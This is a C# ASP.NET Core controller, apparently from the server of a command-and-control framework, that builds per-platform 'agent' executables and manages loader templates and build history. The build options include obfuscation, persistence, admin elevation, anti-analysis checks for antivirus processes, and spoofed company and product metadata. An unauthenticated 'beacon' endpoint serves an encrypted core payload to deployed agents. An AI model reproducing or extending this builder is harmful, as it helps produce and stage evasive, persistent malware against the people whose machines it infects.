using System.Text;
using System.Text.Json;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using LibraNextgen.Common.Models;
using LibraNextgen.Service.Services;

namespace LibraNextgen.Service.Controllers;

[ApiController]
[Route("api/builder")]
[Authorize]
public class BuilderController : ControllerBase
{
    private readonly BuilderBuildService _buildService;

    public BuilderController(BuilderBuildService buildService)
    {
        _buildService = buildService;
    }

    // ── Icon upload ────────────────────────────────────────────────────

    [HttpPost("upload-icon")]
    public async Task<IActionResult> UploadIcon(IFormFile file, CancellationToken ct)
    {
        if (file == null || file.Length == 0)
            return BadRequest(new { error = "No file provided." });

        var ext = Path.GetExtension(file.FileName).ToLower();
        if (ext != ".ico")
            return BadRequest(new { error = "Only .ico files are supported." });

        if (file.Length > 2 * 1024 * 1024)
            return BadRequest(new { error = "Icon file must be under 2 MB." });

        try
        {
            Directory.CreateDirectory(BuilderBuildService.IconUploadDir);
            var fileName = $"{Guid.NewGuid():N}{ext}";
            var filePath = Path.Combine(BuilderBuildService.IconUploadDir, fileName);
            await using var stream = System.IO.File.Create(filePath);
            await file.CopyToAsync(stream, ct);
            return Ok(new { path = filePath });
        }
        catch (Exception ex)
        {
            return StatusCode(500, new { error = ex.Message });
        }
    }

    // ── Build (async) ──────────────────────────────────────────────────

    [HttpPost("build")]
    public IActionResult Build([FromBody] BuildConfigRequest req, [FromQuery] bool rebuild = false)
    {
        if (!BuilderBuildService.PlatformOs.ContainsKey(req.Platform))
            return BadRequest(new { error = $"Unsupported platform: {req.Platform}" });

        // Windows-only options are force-reset for non-Windows targets.
        if (BuilderBuildService.PlatformOs[req.Platform] != "windows")
        {
            req.ApplicationType = "Console";
            req.EnableObfuscation = false;
            req.RequireAdmin = false;
            req.EnablePersistence = false;
            req.IconUrl = null;
            req.CompanyName = null;
            req.FileDescription = null;
            req.ProductName = null;
            req.Copyright = null;
            req.FileVersion = null;
            if (req.AntiAnalysis != null)
            {
                req.AntiAnalysis.check_test_signing = false;
                req.AntiAnalysis.enabled = req.AntiAnalysis.check_av_processes;
            }
        }

        var buildId = Guid.NewGuid().ToString("N")[..8];
        var ext = BuilderBuildService.PlatformOs[req.Platform] == "windows" ? ".exe" : "";
        var record = new Models.BuildRecord
        {
            Id = buildId,
            Platform = req.Platform,
            Config = req,
            FileName = $"agent-{req.Platform}-{buildId}{ext}",
            Status = "building",
            CreatedAt = DateTime.UtcNow.ToString("o"),
        };

        // Save initial record
        var history = BuilderBuildService.LoadHistory();
        history.Insert(0, record);
        BuilderBuildService.SaveHistory(history);

        var job = new Models.BuildJob { Record = record };
        BuilderBuildService.ActiveJobs[buildId] = job;

        // Run Rust build in background
        _ = Task.Run(() => _buildService.RunBuildAsync(buildId, req, job, rebuild));

        return Ok(new { buildId });
    }

    /// <summary>
    /// 仅构建云模块（不构建 agent）：body { platform, enabledModules }。
    /// 写入构建历史（FileName 带 modules- 前缀区分），日志走 stream/{buildId}。
    /// </summary>
    [HttpPost("modules")]
    public IActionResult BuildModules([FromBody] BuildModulesRequest req)
    {
        if (!BuilderBuildService.PlatformOs.ContainsKey(req.Platform))
            return BadRequest(new { error = $"Unsupported platform: {req.Platform}" });

        var buildId = Guid.NewGuid().ToString("N")[..8];
        var record = new Models.BuildRecord
        {
            Id = buildId,
            Platform = req.Platform,
            Config = new BuildConfigRequest
            {
                Platform = req.Platform,
                EnabledModules = req.EnabledModules,
            },
            FileName = $"modules-{req.Platform}-{buildId}",
            Status = "building",
            CreatedAt = DateTime.UtcNow.ToString("o"),
        };

        var history = BuilderBuildService.LoadHistory();
        history.Insert(0, record);
        BuilderBuildService.SaveHistory(history);

        var job = new Models.BuildJob { Record = record };
        BuilderBuildService.ActiveJobs[buildId] = job;

        _ = Task.Run(async () =>
        {
            try
            {
                var ok = await _buildService.BuildModulesOnlyAsync(req.Platform, req.EnabledModules, job);
                if (ok) job.Complete(0);
                else job.Fail("cloud module build failed");
            }
            catch (Exception ex)
            {
                job.Fail(ex.Message);
            }
            BuilderBuildService.UpdateHistory(job);
        });

        return Ok(new { buildId });
    }

    // ── SSE stream ─────────────────────────────────────────────────────

    [HttpGet("stream/{buildId}")]
    public async Task StreamBuild(string buildId, CancellationToken ct)
    {
        Response.Headers["Content-Type"] = "text/event-stream";
        Response.Headers["Cache-Control"] = "no-cache";
        Response.Headers["Connection"] = "keep-alive";

        if (!BuilderBuildService.ActiveJobs.TryGetValue(buildId, out var job))
        {
            // Build may have already completed — check history
            var history = BuilderBuildService.LoadHistory();
            var record = history.FirstOrDefault(r => r.Id == buildId);
            if (record != null)
            {
                await SseWriteAsync($"data: {JsonSerializer.Serialize(new { type = "status", status = record.Status, error = record.Error })}\n\n", ct);
                await SseWriteAsync("data: {\"type\":\"done\"}\n\n", ct);
            }
            else
            {
                await SseWriteAsync("data: {\"type\":\"error\",\"message\":\"Build not found\"}\n\n", ct);
            }
            return;
        }

        var lastIndex = 0;
        while (!ct.IsCancellationRequested)
        {
            var logs = job.GetLogs();
            while (lastIndex < logs.Count)
            {
                var line = JsonSerializer.Serialize(new { type = "log", text = logs[lastIndex] });
                await SseWriteAsync($"data: {line}\n\n", ct);
                lastIndex++;
            }

            if (job.IsCompleted)
            {
                var statusMsg = JsonSerializer.Serialize(new { type = "status", status = job.Record.Status, error = job.Record.Error });
                await SseWriteAsync($"data: {statusMsg}\n\n", ct);
                await SseWriteAsync("data: {\"type\":\"done\"}\n\n", ct);
                break;
            }

            await Task.Delay(200, ct);
        }
    }

    private async Task SseWriteAsync(string text, CancellationToken ct)
    {
        var bytes = Encoding.UTF8.GetBytes(text);
        await Response.Body.WriteAsync(bytes, ct);
        await Response.Body.FlushAsync(ct);
    }

    // ── History CRUD ───────────────────────────────────────────────────

    [HttpGet("list")]
    public IActionResult List()
    {
        var history = BuilderBuildService.LoadHistory();
        // Don't send full config in list view, just summary
        var items = history.Select(r => new
        {
            r.Id,
            r.Platform,
            r.FileName,
            r.FileSize,
            r.Status,
            r.Error,
            r.CreatedAt,
            r.CompletedAt,
        });
        return Ok(items);
    }

    [HttpGet("info/{buildId}")]
    public IActionResult Info(string buildId)
    {
        var history = BuilderBuildService.LoadHistory();
        var record = history.FirstOrDefault(r => r.Id == buildId);
        if (record == null)
            return NotFound(new { error = "Build not found." });
        return Ok(record);
    }

    [HttpGet("download/{buildId}")]
    public IActionResult Download(string buildId)
    {
        var history = BuilderBuildService.LoadHistory();
        var record = history.FirstOrDefault(r => r.Id == buildId);
        if (record == null)
            return NotFound(new { error = "Build not found." });

        var filePath = Path.Combine(BuilderBuildService.OutputBase, buildId, record.FileName);
        if (!System.IO.File.Exists(filePath))
            return NotFound(new { error = "Build file not found on disk." });

        var stream = System.IO.File.OpenRead(filePath);
        return File(stream, "application/octet-stream", record.FileName);
    }

    [HttpDelete("{buildId}")]
    public IActionResult DeleteBuild(string buildId)
    {
        // If build is still running, don't allow delete
        if (BuilderBuildService.ActiveJobs.TryGetValue(buildId, out _))
            return BadRequest(new { error = "Cannot delete a build in progress." });

        var history = BuilderBuildService.LoadHistory();
        var record = history.FirstOrDefault(r => r.Id == buildId);
        if (record != null)
        {
            history.Remove(record);
            BuilderBuildService.SaveHistory(history);
        }

        // Clean up files
        var buildDir = Path.Combine(BuilderBuildService.OutputBase, buildId);
        lock (BuilderBuildService.BuildLock)
        {
            try { if (Directory.Exists(buildDir)) Directory.Delete(buildDir, true); }
            catch { /* best effort */ }
        }

        return Ok(new { status = "ok" });
    }

    // ── Template management ─────────────────────────────────────────────

    [HttpDelete("template")]
    public IActionResult ClearTemplate()
    {
        try
        {
            if (Directory.Exists(BuilderBuildService.TemplateDir))
                Directory.Delete(BuilderBuildService.TemplateDir, true);
            return Ok(new { status = "ok", message = "Loader template cleared. Next build will recompile." });
        }
        catch (Exception ex)
        {
            return StatusCode(500, new { error = ex.Message });
        }
    }

    [HttpGet("template")]
    public IActionResult TemplateStatus()
    {
        var platforms = Directory.Exists(BuilderBuildService.TemplateDir)
            ? Directory.GetDirectories(BuilderBuildService.TemplateDir).Select(d =>
            {
                var file = Directory.GetFiles(d).FirstOrDefault();
                return new
                {
                    platform = Path.GetFileName(d),
                    fileName = file != null ? Path.GetFileName(file) : "",
                    fileSize = file != null ? new FileInfo(file).Length : 0L,
                    updatedAt = file != null ? System.IO.File.GetLastWriteTimeUtc(file).ToString("o") : "",
                };
            }).Where(p => p.fileName != "").ToArray()
            : Array.Empty<object>();

        return Ok(platforms);
    }

    [HttpPost("template/upload")]
    public async Task<IActionResult> UploadTemplate([FromForm] IFormFile file, [FromForm] string platform)
    {
        var validPlatforms = BuilderBuildService.PlatformOs.Keys;
        if (!validPlatforms.Contains(platform))
            return BadRequest(new { error = $"Invalid platform. Must be one of: {string.Join(", ", validPlatforms)}" });

        if (file == null || file.Length == 0)
            return BadRequest(new { error = "No file provided." });

        try
        {
            var platformDir = Path.Combine(BuilderBuildService.TemplateDir, platform);
            Directory.CreateDirectory(platformDir);

            var fileName = BuilderBuildService.PlatformOs[platform] == "windows" ? "loader.exe" : "loader";
            var targetPath = Path.Combine(platformDir, fileName);

            await using (var fs = System.IO.File.Create(targetPath))
            {
                await file.CopyToAsync(fs);
            }

            return Ok(new { status = "ok", platform, fileName, fileSize = file.Length });
        }
        catch (Exception ex)
        {
            return StatusCode(500, new { error = ex.Message });
        }
    }

    [HttpDelete("template/{platform}")]
    public IActionResult DeleteTemplate(string platform)
    {
        var platformDir = Path.Combine(BuilderBuildService.TemplateDir, platform);
        if (!Directory.Exists(platformDir))
            return NotFound(new { error = $"Template for platform '{platform}' not found." });

        try
        {
            Directory.Delete(platformDir, true);
            return Ok(new { status = "ok" });
        }
        catch (Exception ex)
        {
            return StatusCode(500, new { error = ex.Message });
        }
    }

    // ── Core DLL delivery (no auth — DLL is AES-encrypted) ─────────────

    [HttpGet("/api/beacon/core/{buildId}")]
    [AllowAnonymous]
    public IActionResult DownloadCore(string buildId)
    {
        var corePath = Path.Combine(BuilderBuildService.OutputBase, buildId, "core.bin");
        if (!System.IO.File.Exists(corePath))
            return NotFound(new { error = "Core not found." });

        var bytes = System.IO.File.ReadAllBytes(corePath);
        return File(bytes, "application/octet-stream", "core.bin");
    }
}

/// <summary>仅构建模块的请求体。</summary>
public record BuildModulesRequest(string Platform, List<string>? EnabledModules);
